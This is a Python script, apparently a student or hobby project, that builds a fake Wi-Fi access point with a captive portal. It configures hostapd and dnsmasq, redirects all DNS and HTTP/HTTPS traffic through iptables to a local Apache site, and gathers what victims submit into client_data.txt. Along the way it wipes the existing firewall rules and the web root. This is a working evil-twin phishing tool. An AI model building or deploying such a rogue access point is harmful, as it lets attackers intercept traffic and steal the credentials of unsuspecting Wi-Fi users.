import os
import sys
import pathlib
import subprocess
import time
from UI import *
from threading import Thread

def check_modify(stamp):
    while True:
        time.sleep(2)
        mod = stamp == os.stat("dnsmasq.conf").st_mtime
        if not mod:
            # kill the old dnsmasq process
            print("LOGIN!")
            os.system(f"sudo kill -9 $(pgrep -f dnsmasq)")
            os.system("dnsmasq -C dnsmasq.conf")
            break

def openAP(net_ssid,net_channel,internet_interface,interface):
    # Source: https://hakin9.org/create-a-fake-access-point-by-anastasis-vasileiadis/
    # Source: https://zsecurity.org/how-to-start-a-fake-access-point-fake-wifi/
    # Source: https://andrewwippler.com/2016/03/11/wifi-captive-portal/
    # Source: https://wiki.andybev.com/doku.php?id=using_iptables_and_php_to_create_a_captive_portal
    # Source: https://unix.stackexchange.com/questions/132130/iptables-based-redirect-captive-portal-style
    CAPTIVEPORTAL_IP = "10.0.0.1"
    CAPTIVEPORTAL_IP = "192.168.24.1"

    # enable monitor mode
    os.system(f'sudo ifconfig {interface} down')
    os.system(f'sudo iwconfig {interface} mode monitor')
    os.system(f'sudo ifconfig {interface} up')

    # Disable all old proccess
    os.system('service hostapd stop')
    os.system('service dnsmasq stop')
    os.system('killall dnsmasq >/dev/null 2>&1')
    os.system('killall hostapd >/dev/null 2>&1')

    # Clear port 53
    os.system('systemctl disable systemd-resolved.service >/dev/null 2>&1')
    os.system('systemctl stop systemd-resolved>/dev/null 2>&1')

    # Create configuration files
    conf_text = f"interface={interface}\ndriver=nl80211\nssid={net_ssid}"\
    f"\nchannel={net_channel}\nmacaddr_acl=0\nignore_broadcast_ssid=0\n"\
    "wme_enabled=1"
    conf_file = open("hostapd.conf", "w")
    n = conf_file.write(conf_text)
    conf_file.close()

    # Save file with the current path
    current_path=pathlib.Path().resolve()
    file1 = open("web/path.txt","w")
    file1.writelines(str(current_path))
    file1.close()
    conf_text = \
    f"bogus-priv\n"\
    f"server=/localnet/{CAPTIVEPORTAL_IP}\n"\
    f"local=/localnet/\n"\
    f"interface={interface}\n"\
    f"domain=localnet\n"\
    f"dhcp-range=192.168.24.50,192.168.24.250,2h\n"\
    f"address=/www.google.com/216.58.209.2\n"\
    f"address=/#/{CAPTIVEPORTAL_IP}\n"\
    f"dhcp-option=1,255.255.255.0\n"\
    f"dhcp-option=3,{CAPTIVEPORTAL_IP}\n"\
    f"dhcp-option=6,{CAPTIVEPORTAL_IP}\n"
    f"dhcp-authoritative\n"
    
    conf_file = open("dnsmasq.conf", "w")
    conf_file.write(conf_text)
    conf_file.close()
    os.system('chmod 777 dnsmasq.conf')
    # Creation time
    stamp = os.stat("dnsmasq.conf").st_mtime

    # AP with address 192.168.24.1 on the given interface
    # os.system(f"ifconfig {interface} up 192.168.24.1 netmask 255.255.255.0")
    os.system(f"ifconfig {interface} up {CAPTIVEPORTAL_IP} netmask 255.255.255.0")

    # # Clear all IP Rules
    os.system('iptables --flush')
    os.system('iptables --table nat --flush')
    os.system('iptables --delete-chain')
    os.system('iptables --table nat --delete-chain')

    # Redirect any request to the captive portal
    os.system(f'iptables -t nat -A PREROUTING  -i {internet_interface} -p tcp --dport 80 -j DNAT  --to-destination {CAPTIVEPORTAL_IP}:80')
    os.system(f'iptables -t nat -A PREROUTING  -i {internet_interface} -p tcp --dport 443 -j DNAT  --to-destination {CAPTIVEPORTAL_IP}:80')
    #os.system(f'iptables -t nat -A PREROUTING -i {internet_interface} -p tcp -m multiport --dport 80,443 -j DNAT --to-destination {CAPTIVEPORTAL_IP}:80')
    
    # Enable internet access use the second interface
    os.system(f'iptables -A FORWARD --in-interface {interface} -j ACCEPT')
    os.system(f'iptables -t nat -A POSTROUTING --out-interface {internet_interface} -j MASQUERADE')

    # Initial wifi interface configuration (seems to fix problems)
    os.system(f'ip link set {interface} down')
    os.system(f'ip addr flush dev {interface}')
    os.system(f'ip link set {interface} up')
    os.system(f'ip addr add 192.168.24.1/24 dev {interface}')
    os.system(f'sleep 3')
    # Or try to init additional AP settings
    # os.system(f'chmod +x initSoftAP')
    # os.system(f'sudo ./initSoftAP {interface} {internet_interface}')
    # https://askubuntu.com/questions/451708/php-script-not-executing-on-apache-server

    # Enable IP forwarding from one interface to another
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

    # Link dnsmasq to the configuration file.
    cmd = "sudo dnsmasq -C dnsmasq.conf"
    p = subprocess.Popen(cmd,shell=True,preexec_fn=os.setsid)

    # Start a thread that check if there any change in the dnsmasq.conf file
    modify = Thread(target=check_modify, args= (stamp,))
    modify.start()

    # Running the web server 
    os.system('sudo rm -r /var/www/html/')
    os.system('sudo cp -r web /var/www/html/')
    os.system('chmod 777 /var/www/html/client_data.txt')
    os.system(f'route add default gw {CAPTIVEPORTAL_IP}')
    # Enable rewrite and override for .htaccess and php
    os.system('sudo cp -f 000-default.conf /etc/apache2/sites-enabled/')
    os.system('a2enmod rewrite')
    # reload and restart apache2
    os.system('service apache2 restart')

    # Link hostpad to the configuration file.
    os.system("hostapd hostapd.conf")
    
    # Reset all setting to defualt
    os.system("systemctl enable systemd-resolved.service >/dev/null 2>&1") 
    os.system("systemctl start systemd-resolved >/dev/null 2>&1") 
    os.system("sudo rm /etc/resolv.conf")
    os.system("sudo ln -s /run/systemd/resolve/resolv.conf /etc/resolv.conf")
    # kill all dnsmasq process
    os.system("sudo kill -9 $(pgrep -f dnsmasq)")
    # Delete the configuration files
    os.system("sudo rm hostapd.conf dnsmasq.conf")


# Requirements:
# 1. apache2
# 2. php (Run sudo apt-get install apache2 php libapache2-mod-php
#         OR sudo apt-get install apache2 php5 libapache2-mod-php5)
if __name__ == "__main__":
    printFakeApWelcome()
    print(f'if failed try \"nmcli device set {sys.argv[4]} managed no\"')
    openAP(sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4])
    os.system('cat /var/www/html/client_data.txt >> client_data.txt')